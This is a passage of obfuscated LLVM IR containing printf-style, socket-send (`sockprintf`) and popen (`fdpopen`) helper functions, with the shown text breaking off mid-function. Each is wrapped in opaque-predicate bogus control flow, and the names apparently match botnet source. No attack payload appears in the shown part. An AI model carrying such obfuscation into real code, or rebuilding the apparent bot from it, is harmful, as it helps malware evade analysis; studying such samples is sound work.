  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %251

; <label>:251:                                    ; preds = %originalBBpart267, %originalBBpart259
  %252 = load i32, i32* %15, align 4
  %253 = icmp sgt i32 %252, 0
  br i1 %253, label %254, label %278

; <label>:254:                                    ; preds = %251
  %255 = load i8**, i8*** %13, align 8
  %256 = load i32, i32* %18, align 4
  call void @printchar(i8** %255, i32 %256)
  %257 = load i32, i32* %17, align 4
  %258 = add nsw i32 %257, 1
  store i32 %258, i32* %17, align 4
  br label %259

; <label>:259:                                    ; preds = %254
  %260 = load i32, i32* @x.9
  %261 = load i32, i32* @y.10
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %259
  %268 = load i32, i32* %15, align 4
  %269 = add nsw i32 %268, -1
  store i32 %269, i32* %15, align 4
  %270 = load i32, i32* @x.9
  %271 = load i32, i32* @y.10
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart267, label %originalBB61alteredBB

originalBBpart267:                                ; preds = %originalBB61
  br label %251

; <label>:278:                                    ; preds = %251
  %279 = load i32, i32* %17, align 4
  ret i32 %279

originalBBalteredBB:                              ; preds = %originalBB, %4
  %280 = alloca i8**, align 8
  %281 = alloca i8*, align 8
  %282 = alloca i32, align 4
  %283 = alloca i32, align 4
  %284 = alloca i32, align 4
  %285 = alloca i32, align 4
  %286 = alloca i32, align 4
  %287 = alloca i8*, align 8
  store i8** %0, i8*** %280, align 8
  store i8* %1, i8** %281, align 8
  store i32 %2, i32* %282, align 4
  store i32 %3, i32* %283, align 4
  store i32 0, i32* %284, align 4
  store i32 32, i32* %285, align 4
  %288 = load i32, i32* %282, align 4
  %289 = icmp sgt i32 %288, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i32 0, i32* %19, align 4
  %290 = load i8*, i8** %14, align 8
  store i8* %290, i8** %20, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  %291 = load i8*, i8** %20, align 8
  %292 = load i8, i8* %291, align 1
  %293 = icmp ne i8 %292, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %79
  store i32 0, i32* %15, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %96
  %294 = load i32, i32* %19, align 4
  %295 = load i32, i32* %15, align 4
  %296 = sub nsw i32 %295, %294
  store i32 %296, i32* %15, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %130
  %297 = load i8**, i8*** %13, align 8
  %298 = load i32, i32* %18, align 4
  call void @printchar(i8** %297, i32 %298)
  %299 = load i32, i32* %17, align 4
  %_ = shl i32 %299, 1
  %_19 = shl i32 %299, 1
  %_20 = shl i32 %299, 1
  %_21 = shl i32 %299, 1
  %_22 = shl i32 %299, 1
  %_23 = sub i32 %299, 1
  %gen = mul i32 %_23, 1
  %300 = add nsw i32 %299, 1
  store i32 %300, i32* %17, align 4
  br label %originalBB18

originalBB27alteredBB:                            ; preds = %originalBB27, %151
  %301 = load i32, i32* %15, align 4
  %_28 = sub i32 %301, -1
  %gen29 = mul i32 %_28, -1
  %_30 = sub i32 %301, -1
  %gen31 = mul i32 %_30, -1
  %_32 = shl i32 %301, -1
  %_33 = shl i32 %301, -1
  %302 = add nsw i32 %301, -1
  store i32 %302, i32* %15, align 4
  br label %originalBB27

originalBB37alteredBB:                            ; preds = %originalBB37, %172
  %303 = load i8*, i8** %14, align 8
  %304 = load i8, i8* %303, align 1
  %305 = icmp ne i8 %304, 0
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %192
  %306 = load i8**, i8*** %13, align 8
  %307 = load i8*, i8** %14, align 8
  %308 = load i8, i8* %307, align 1
  %309 = zext i8 %308 to i32
  call void @printchar(i8** %306, i32 %309)
  %310 = load i32, i32* %17, align 4
  %_42 = sub i32 %310, 1
  %gen43 = mul i32 %_42, 1
  %_44 = sub i32 %310, 1
  %gen45 = mul i32 %_44, 1
  %_46 = sub i32 %310, 1
  %gen47 = mul i32 %_46, 1
  %_48 = shl i32 %310, 1
  %_49 = shl i32 %310, 1
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %17, align 4
  br label %originalBB41

originalBB53alteredBB:                            ; preds = %originalBB53, %215
  %312 = load i8*, i8** %14, align 8
  %313 = getelementptr inbounds i8, i8* %312, i32 1
  store i8* %313, i8** %14, align 8
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %234
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %259
  %314 = load i32, i32* %15, align 4
  %_62 = sub i32 0, %314
  %gen63 = add i32 %_62, -1
  %_64 = sub i32 %314, -1
  %gen65 = mul i32 %_64, -1
  %315 = add nsw i32 %314, -1
  store i32 %315, i32* %15, align 4
  br label %originalBB61
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %166

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %77

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* @x.11
  %38 = load i32, i32* @y.12
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i32, i32* %11, align 4
  %46 = icmp eq i32 %45, 10
  %47 = load i32, i32* @x.11
  %48 = load i32, i32* @y.12
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %46, label %55, label %77

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* @x.11
  %57 = load i32, i32* @y.12
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i32, i32* %10, align 4
  %65 = icmp slt i32 %64, 0
  %66 = load i32, i32* @x.11
  %67 = load i32, i32* @y.12
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %74, label %77

; <label>:74:                                     ; preds = %originalBBpart24
  store i32 1, i32* %19, align 4
  %75 = load i32, i32* %10, align 4
  %76 = sub nsw i32 0, %75
  store i32 %76, i32* %21, align 4
  br label %77

; <label>:77:                                     ; preds = %74, %originalBBpart24, %originalBBpart2, %33
  %78 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %79 = getelementptr inbounds i8, i8* %78, i64 12
  %80 = getelementptr inbounds i8, i8* %79, i64 -1
  store i8* %80, i8** %17, align 8
  %81 = load i8*, i8** %17, align 8
  store i8 0, i8* %81, align 1
  br label %82

; <label>:82:                                     ; preds = %originalBBpart219, %77
  %83 = load i32, i32* %21, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %122

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* %21, align 4
  %87 = load i32, i32* %11, align 4
  %88 = urem i32 %86, %87
  store i32 %88, i32* %18, align 4
  %89 = load i32, i32* %18, align 4
  %90 = icmp sge i32 %89, 10
  br i1 %90, label %91, label %97

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* %15, align 4
  %93 = sub nsw i32 %92, 48
  %94 = sub nsw i32 %93, 10
  %95 = load i32, i32* %18, align 4
  %96 = add nsw i32 %95, %94
  store i32 %96, i32* %18, align 4
  br label %97

; <label>:97:                                     ; preds = %91, %85
  %98 = load i32, i32* @x.11
  %99 = load i32, i32* @y.12
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  %106 = load i32, i32* %18, align 4
  %107 = add nsw i32 %106, 48
  %108 = trunc i32 %107 to i8
  %109 = load i8*, i8** %17, align 8
  %110 = getelementptr inbounds i8, i8* %109, i32 -1
  store i8* %110, i8** %17, align 8
  store i8 %108, i8* %110, align 1
  %111 = load i32, i32* %11, align 4
  %112 = load i32, i32* %21, align 4
  %113 = udiv i32 %112, %111
  store i32 %113, i32* %21, align 4
  %114 = load i32, i32* @x.11
  %115 = load i32, i32* @y.12
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br label %82

; <label>:122:                                    ; preds = %82
  %123 = load i32, i32* %19, align 4
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %125, label %142

; <label>:125:                                    ; preds = %122
  %126 = load i32, i32* %13, align 4
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %138

; <label>:128:                                    ; preds = %125
  %129 = load i32, i32* %14, align 4
  %130 = and i32 %129, 2
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %138

; <label>:132:                                    ; preds = %128
  %133 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %133, i32 45)
  %134 = load i32, i32* %20, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %20, align 4
  %136 = load i32, i32* %13, align 4
  %137 = add nsw i32 %136, -1
  store i32 %137, i32* %13, align 4
  br label %141

; <label>:138:                                    ; preds = %128, %125
  %139 = load i8*, i8** %17, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 -1
  store i8* %140, i8** %17, align 8
  store i8 45, i8* %140, align 1
  br label %141

; <label>:141:                                    ; preds = %138, %132
  br label %142

; <label>:142:                                    ; preds = %141, %122
  %143 = load i32, i32* @x.11
  %144 = load i32, i32* @y.12
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %142
  %151 = load i32, i32* %20, align 4
  %152 = load i8**, i8*** %9, align 8
  %153 = load i8*, i8** %17, align 8
  %154 = load i32, i32* %13, align 4
  %155 = load i32, i32* %14, align 4
  %156 = call i32 @prints(i8** %152, i8* %153, i32 %154, i32 %155)
  %157 = add nsw i32 %151, %156
  store i32 %157, i32* %8, align 4
  %158 = load i32, i32* @x.11
  %159 = load i32, i32* @y.12
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart225, label %originalBB21alteredBB

originalBBpart225:                                ; preds = %originalBB21
  br label %166

; <label>:166:                                    ; preds = %originalBBpart225, %25
  %167 = load i32, i32* %8, align 4
  ret i32 %167

originalBBalteredBB:                              ; preds = %originalBB, %36
  %168 = load i32, i32* %11, align 4
  %169 = icmp eq i32 %168, 10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %170 = load i32, i32* %10, align 4
  %171 = icmp slt i32 %170, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  %172 = load i32, i32* %18, align 4
  %_ = shl i32 %172, 48
  %_7 = shl i32 %172, 48
  %173 = add nsw i32 %172, 48
  %174 = trunc i32 %173 to i8
  %175 = load i8*, i8** %17, align 8
  %176 = getelementptr inbounds i8, i8* %175, i32 -1
  store i8* %176, i8** %17, align 8
  store i8 %174, i8* %176, align 1
  %177 = load i32, i32* %11, align 4
  %178 = load i32, i32* %21, align 4
  %_8 = sub i32 %178, %177
  %gen = mul i32 %_8, %177
  %_9 = sub i32 0, %178
  %gen10 = add i32 %_9, %177
  %_11 = shl i32 %178, %177
  %_12 = sub i32 0, %178
  %gen13 = add i32 %_12, %177
  %_14 = sub i32 0, %178
  %gen15 = add i32 %_14, %177
  %_16 = sub i32 0, %178
  %gen17 = add i32 %_16, %177
  %179 = udiv i32 %178, %177
  store i32 %179, i32* %21, align 4
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %142
  %180 = load i32, i32* %20, align 4
  %181 = load i8**, i8*** %9, align 8
  %182 = load i8*, i8** %17, align 8
  %183 = load i32, i32* %13, align 4
  %184 = load i32, i32* %14, align 4
  %185 = call i32 @prints(i8** %181, i8* %182, i32 %183, i32 %184)
  %_22 = sub i32 %180, %185
  %gen23 = mul i32 %_22, %185
  %186 = add nsw i32 %180, %185
  store i32 %186, i32* %8, align 4
  br label %originalBB21
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %31

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* @x.13
  %9 = load i32, i32* @y.14
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load i8**, i8*** %3, align 8
  %19 = load i8*, i8** %18, align 8
  store i8 %17, i8* %19, align 1
  %20 = load i8**, i8*** %3, align 8
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %20, align 8
  %23 = load i32, i32* @x.13
  %24 = load i32, i32* @y.14
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %50

; <label>:31:                                     ; preds = %2
  %32 = load i32, i32* @x.13
  %33 = load i32, i32* @y.14
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = bitcast i32* %4 to i8*
  %41 = call i64 @write(i32 1, i8* %40, i64 1)
  %42 = load i32, i32* @x.13
  %43 = load i32, i32* @y.14
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %51 = load i32, i32* %4, align 4
  %52 = trunc i32 %51 to i8
  %53 = load i8**, i8*** %3, align 8
  %54 = load i8*, i8** %53, align 8
  store i8 %52, i8* %54, align 1
  %55 = load i8**, i8*** %3, align 8
  %56 = load i8*, i8** %55, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %55, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %58 = bitcast i32* %4 to i8*
  %59 = call i64 @write(i32 1, i8* %58, i64 1)
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = load i32, i32* @x.15
  %4 = load i32, i32* @y.16
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %14 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %15 = bitcast %struct.__va_list_tag* %14 to i8*
  call void @llvm.va_start(i8* %15)
  %16 = load i8*, i8** %12, align 8
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %18 = call i32 @print(i8** %11, i8* %16, %struct.__va_list_tag* %17)
  %19 = load i32, i32* @x.15
  %20 = load i32, i32* @y.16
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %18

originalBBalteredBB:                              ; preds = %originalBB, %2
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %27, align 8
  store i8* %1, i8** %28, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %31 = bitcast %struct.__va_list_tag* %30 to i8*
  call void @llvm.va_start(i8* %31)
  %32 = load i8*, i8** %28, align 8
  %33 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %34 = call i32 @print(i8** %27, i8* %32, %struct.__va_list_tag* %33)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.17
  %4 = load i32, i32* @y.18
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #2
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i8*, i8** %14, align 8
  %32 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* %31)
  %33 = load i32, i32* %11, align 4
  %34 = load i8*, i8** %14, align 8
  %35 = load i8*, i8** %14, align 8
  %36 = call i64 @strlen(i8* %35) #10
  %37 = call i64 @send(i32 %33, i8* %34, i64 %36, i32 16384)
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %16, align 4
  %39 = load i8*, i8** %14, align 8
  call void @free(i8* %39) #2
  %40 = load i32, i32* %16, align 4
  %41 = load i32, i32* @x.17
  %42 = load i32, i32* @y.18
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %40

originalBBalteredBB:                              ; preds = %originalBB, %2
  %49 = alloca i32, align 4
  %50 = alloca i8*, align 8
  %51 = alloca i8*, align 8
  %52 = alloca i8*, align 8
  %53 = alloca [1 x %struct.__va_list_tag], align 16
  %54 = alloca i32, align 4
  store i32 %0, i32* %49, align 4
  store i8* %1, i8** %50, align 8
  %55 = call noalias i8* @malloc(i64 2048) #2
  store i8* %55, i8** %51, align 8
  %56 = load i8*, i8** %51, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 2048, i32 1, i1 false)
  %57 = load i8*, i8** %51, align 8
  store i8* %57, i8** %52, align 8
  %58 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %59 = bitcast %struct.__va_list_tag* %58 to i8*
  call void @llvm.va_start(i8* %59)
  %60 = load i8*, i8** %50, align 8
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %62 = call i32 @print(i8** %51, i8* %60, %struct.__va_list_tag* %61)
  %63 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %64 = bitcast %struct.__va_list_tag* %63 to i8*
  call void @llvm.va_end(i8* %64)
  %65 = load i8*, i8** %52, align 8
  %66 = load i8*, i8** %52, align 8
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  store i8 10, i8* %68, align 1
  %69 = load i8*, i8** %52, align 8
  %70 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* %69)
  %71 = load i32, i32* %49, align 4
  %72 = load i8*, i8** %52, align 8
  %73 = load i8*, i8** %52, align 8
  %74 = call i64 @strlen(i8* %73) #10
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* %54, align 4
  %77 = load i8*, i8** %52, align 8
  call void @free(i8* %77) #2
  %78 = load i32, i32* %54, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %203

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %203

; <label>:31:                                     ; preds = %26
  %32 = load i32, i32* @x.19
  %33 = load i32, i32* @y.20
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = load i32*, i32** @fdopen_pids, align 8
  %41 = icmp eq i32* %40, null
  %42 = load i32, i32* @x.19
  %43 = load i32, i32* @y.20
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %41, label %50, label %86

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = call i32 @getdtablesize() #2
  store i32 %51, i32* %8, align 4
  %52 = icmp sle i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %50
  store i32 -1, i32* %3, align 4
  br label %203

; <label>:54:                                     ; preds = %50
  %55 = load i32, i32* @x.19
  %56 = load i32, i32* @y.20
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %65 = mul i64 %64, 4
  %66 = trunc i64 %65 to i32
  %67 = zext i32 %66 to i64
  %68 = call noalias i8* @malloc(i64 %67) #2
  %69 = bitcast i8* %68 to i32*
  store i32* %69, i32** @fdopen_pids, align 8
  %70 = icmp eq i32* %69, null
  %71 = load i32, i32* @x.19
  %72 = load i32, i32* @y.20
